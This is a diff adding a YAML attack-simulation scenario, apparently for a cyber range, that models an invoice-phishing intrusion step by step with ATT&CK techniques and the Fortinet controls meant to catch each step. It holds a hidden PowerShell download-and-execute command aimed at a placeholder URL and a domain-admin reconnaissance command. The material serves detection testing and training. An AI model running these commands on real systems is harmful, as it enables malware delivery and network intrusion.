@@ -1,0 +1,38 @@
+id: S1
+name: "Invoice phishing: loader, C2 and reconnaissance"
+environment: andes-range
+summary: >-
+  A finance clerk opens a fake DIAN invoice link, the attached document launches PowerShell, a
+  loader is downloaded from a malware host, it beacons to a QakBot-style C2 every minute, and the
+  operator starts mapping the domain. Most of 2023-2025 ransomware began roughly like this.
+steps:
+  - id: lure
+    title: FIN-PC opens the phishing link
+    tactic: Initial Access
+    attack: T1566.002 Spearphishing Link
+    do: {connect: {from: FIN-PC, to: "phish:0", port: 443, process: msedge.exe}}
+    controls: [FortiGate threat feed (external-resource with a phishing feed), FortiEDR Exfiltration Prevention]
+  - id: macro
+    title: The document starts PowerShell
+    tactic: Execution
+    attack: T1059.001 PowerShell
+    do: {proc: {host: FIN-PC, name: powershell.exe, parent: WINWORD.EXE, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmd: "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{{url:0}}/i')"}}
+    controls: [FortiEDR Execution Prevention]
+  - id: loader
+    title: The loader is downloaded
+    tactic: Command and Control
+    attack: T1105 Ingress Tool Transfer
+    do: {connect: {from: FIN-PC, to: "url:0", port: 80, process: powershell.exe}}
+    controls: [FortiGate threat feed (malware URLs), FortiEDR Exfiltration Prevention]
+  - id: beacon
+    title: The implant beacons to its C2
+    tactic: Command and Control
+    attack: T1071.001 Web Protocols
+    do: {connect: {from: FIN-PC, to: "c2:0", port: 443, times: 6, every: 6, process: rundll32.exe}}
+    controls: [FortiGate C2 feed (external-resource), FortiEDR Exfiltration Prevention]
+  - id: recon
+    title: The operator maps the domain
+    tactic: Discovery
+    attack: T1087.002 Domain Account
+    do: {proc: {host: FIN-PC, name: cmd.exe, parent: rundll32.exe, cmd: "cmd.exe /c net group \"Domain Admins\" /domain & nltest /dclist:andes.local"}}
+    controls: [FortiEDR Execution Prevention (lineage)]
